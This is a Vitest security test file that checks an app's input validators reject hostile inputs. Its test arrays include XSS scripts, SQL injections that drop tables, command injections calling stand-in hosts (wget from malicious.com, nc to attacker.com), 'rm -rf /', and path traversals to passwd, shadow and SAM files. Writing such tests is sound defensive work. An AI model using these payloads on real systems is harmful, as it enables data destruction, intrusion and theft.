/**
 * Security validation tests for input sanitization
 * Tests malicious payloads and XSS prevention
 */

import { describe, it, expect, beforeAll } from 'vitest';
import {
  validateSearchQuery,
  validateTopicName,
  escapeHtml,
  sanitizeInput,
  ValidationDefaults,
} from '../src/utils/input-validation.js';

// Mock the logger to prevent initialization errors in tests
beforeAll(() => {
  // We don't need to initialize the actual logger for validation tests
  // The validation utility handles logger errors gracefully
});

describe('Input Security Validation', () => {
  describe('escapeHtml', () => {
    it('should escape XSS attack vectors', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><script>alert(1)</script>',
      ];

      maliciousInputs.forEach(input => {
        const escaped = escapeHtml(input);
        expect(escaped).not.toContain('<script>');
        // Note: escapeHtml only escapes HTML characters, not javascript: URIs
        // Full sanitization happens in sanitizeInput
        expect(escaped).not.toContain('<iframe');
        expect(escaped).not.toContain('<img');
        expect(escaped).not.toContain('onerror=');
      });
    });

    it('should handle edge cases safely', () => {
      expect(escapeHtml('')).toBe('');
      expect(escapeHtml('normal text')).toBe('normal text');
      expect(
        escapeHtml('text with "quotes" and \'apostrophes\'')
      ).not.toContain('"');
      expect(
        escapeHtml('text with "quotes" and \'apostrophes\'')
      ).not.toContain("'");
    });
  });

  describe('sanitizeInput', () => {
    it('should block SQL injection patterns', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "1'; DELETE FROM users WHERE 't' = 't",
        "'; EXEC xp_cmdshell('format c:'); --",
        'UNION SELECT username, password FROM users--',
        "admin'--",
        "' OR '1'='1",
      ];

      sqlInjections.forEach(injection => {
        const result = sanitizeInput(
          injection,
          ValidationDefaults.SEARCH_QUERY
        );
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
        expect(result.sanitized).not.toContain('DROP');
        expect(result.sanitized).not.toContain('DELETE');
        expect(result.sanitized).not.toContain('UNION');
      });
    });

    it('should block command injection patterns', () => {
      const commandInjections = [
        'test; rm -rf /',
        'file.txt && wget http://malicious.com/script.sh',
        'input | nc attacker.com 4444',
        'test `curl http://evil.com`',
        'test $(wget malicious.com)',
      ];

      commandInjections.forEach(injection => {
        const result = sanitizeInput(
          injection,
          ValidationDefaults.SEARCH_QUERY
        );
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
        expect(result.sanitized).not.toContain('rm -rf');
        expect(result.sanitized).not.toContain('wget');
        expect(result.sanitized).not.toContain('curl');
      });
    });

    it('should handle path traversal attacks', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/shadow',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ];

      pathTraversals.forEach(traversal => {
        const result = sanitizeInput(
          traversal,
          ValidationDefaults.SEARCH_QUERY
        );
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
        expect(result.sanitized).not.toContain('../');
        expect(result.sanitized).not.toContain('..\\');
      });
    });

    it('should handle buffer overflow attempts', () => {
      const bufferOverflows = [
        'A'.repeat(1000), // Very long string
        'x'.repeat(10000), // Extremely long string
        '1'.repeat(500) + '<script>alert(1)</script>', // Long + XSS
      ];

      bufferOverflows.forEach(overflow => {
        const result = sanitizeInput(overflow, ValidationDefaults.SEARCH_QUERY);
        expect(result.sanitized.length).toBeLessThanOrEqual(
          ValidationDefaults.SEARCH_QUERY.maxLength
        );
        if (overflow.includes('<script>')) {
          expect(result.violations.length).toBeGreaterThan(0);
        }
      });
    });

    it('should allow safe, normal inputs', () => {
      const safeInputs = [
        'ADHD medication management',
        'How to improve focus and concentration',
        'Cognitive behavioral therapy techniques',
        'Organization systems for executive dysfunction',
        'Time management strategies',
      ];

      safeInputs.forEach(safe => {
        const result = sanitizeInput(safe, ValidationDefaults.SEARCH_QUERY);
        expect(result.isValid).toBe(true);
        expect(result.violations.length).toBe(0);
        expect(result.sanitized).toBe(safe.trim());
      });
    });
  });

  describe('validateSearchQuery', () => {
    it('should validate ADHD-relevant search queries', () => {
      const adhdQueries = [
        'ADHD medication effects',
        'executive function strategies',
        'focus and concentration techniques',
        'time blindness management',
        'hyperfocus productivity',
      ];

      adhdQueries.forEach(query => {
        const result = validateSearchQuery(query);
        expect(result.isValid).toBe(true);
        expect(result.violations.length).toBe(0);
        expect(result.sanitized.length).toBeGreaterThan(0);
      });
    });

    it('should reject malicious search queries', () => {
      const maliciousQueries = [
        '<script>document.location="http://attacker.com/"</script>',
        'ADHD" OR 1=1--',
        'focus; wget http://malicious.com/payload.sh',
        "ADHD' UNION SELECT password FROM users--",
        'x'.repeat(1000), // Too long
      ];

      maliciousQueries.forEach(query => {
        const result = validateSearchQuery(query);
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });

    it('should reject overly complex queries (DoS protection)', () => {
      // Create a query with too many words
      const complexQuery = Array(60).fill('word').join(' ');
      const result = validateSearchQuery(complexQuery);

      expect(result.isValid).toBe(false);
      expect(result.violations.some(v => v.includes('too many words'))).toBe(
        true
      );
    });

    it('should reject empty queries after sanitization', () => {
      const emptyAfterSanitization = [
        '<script></script>',
        '   ',
        ';;;;',
        '""""""',
      ];

      emptyAfterSanitization.forEach(query => {
        const result = validateSearchQuery(query);
        expect(result.isValid).toBe(false);
        expect(result.violations.some(v => v.includes('empty'))).toBe(true);
      });
    });
  });

  describe('validateTopicName', () => {
    it('should validate educational topic names', () => {
      const educationalTopics = [
        'Biology',
        'World History',
        'Computer Science',
        'Mathematics & Statistics',
        'Psychology (ADHD)',
        'Chemistry - Organic',
      ];

      educationalTopics.forEach(topic => {
        const result = validateTopicName(topic);
        expect(result.isValid).toBe(true);
        expect(result.violations.length).toBe(0);
        expect(result.sanitized.length).toBeGreaterThan(1);
      });
    });

    it('should reject malicious topic names', () => {
      const maliciousTopics = [
        '<iframe src="javascript:alert(1)">',
        "Math'; DROP TABLE courses; --",
        'Science && wget malicious.com',
        'History | nc attacker.com 4444',
        'x'.repeat(200), // Too long
      ];

      maliciousTopics.forEach(topic => {
        const result = validateTopicName(topic);
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });

    it('should reject topics with invalid characters', () => {
      const invalidTopics = [
        'Math<script>',
        'Science{}',
        'History[]',
        'Biology$$$$',
        'Chemistry@#$%',
      ];

      invalidTopics.forEach(topic => {
        const result = validateTopicName(topic);
        expect(result.isValid).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });

    it('should reject topics that are too short after sanitization', () => {
      const tooShort = ['A', '<>', ' ', ';;'];

      tooShort.forEach(topic => {
        const result = validateTopicName(topic);
        expect(result.isValid).toBe(false);
        // Check if ANY violation mentions length requirement or invalid content
        const hasExpectedViolation = result.violations.some(
          v =>
            v.includes('at least 2 characters') ||
            v.includes('invalid characters') ||
            v.includes('HTML entities') ||
            v.includes('Dangerous pattern')
        );
        expect(hasExpectedViolation).toBe(true);
      });
    });
  });

  describe('Security edge cases', () => {
    it('should handle Unicode normalization attacks', () => {
      const unicodeAttacks = [
        '\u003cscript\u003e', // Unicode encoded <script>
        '\u0022\u003e\u003cscript\u003e', // "><script>
        '\u0027\u0020OR\u0020\u00271\u0027=\u00271', // ' OR '1'='1'
      ];

      unicodeAttacks.forEach(attack => {
        const searchResult = validateSearchQuery(attack);
        const topicResult = validateTopicName(attack);

        expect(searchResult.isValid).toBe(false);
        expect(topicResult.isValid).toBe(false);
      });
    });

    it('should handle null bytes and control characters', () => {
      const controlCharAttacks = [
        'test\x00.txt',
        'query\x0d\x0a<script>',
        'topic\x7f\x80\x81',
        'search\x1f\x1e\x1d',
      ];

      controlCharAttacks.forEach(attack => {
        const searchResult = validateSearchQuery(attack);
        const topicResult = validateTopicName(attack);

        // All control character attacks should be flagged as invalid
        expect(searchResult.isValid).toBe(false);
        expect(topicResult.isValid).toBe(false);

        // And should not contain control chars in sanitized output
        // eslint-disable-next-line no-control-regex
        expect(searchResult.sanitized).not.toMatch(/[\x00-\x1f\x7f-\x9f]/);
        // eslint-disable-next-line no-control-regex
        expect(topicResult.sanitized).not.toMatch(/[\x00-\x1f\x7f-\x9f]/);
      });
    });

    it('should handle mixed attack vectors', () => {
      const mixedAttacks = [
        '<script>alert("XSS")</script>\'; DROP TABLE users; --',
        'ADHD" OR 1=1--<iframe src="javascript:alert(1)">',
        '../../../etc/passwd && wget malicious.com',
        '`curl http://evil.com`<script>location="http://attacker.com"</script>',
      ];

      mixedAttacks.forEach(attack => {
        const searchResult = validateSearchQuery(attack);
        const topicResult = validateTopicName(attack);

        expect(searchResult.isValid).toBe(false);
        expect(topicResult.isValid).toBe(false);
        expect(searchResult.violations.length).toBeGreaterThan(0);
        expect(topicResult.violations.length).toBeGreaterThan(0);
      });
    });
  });
});
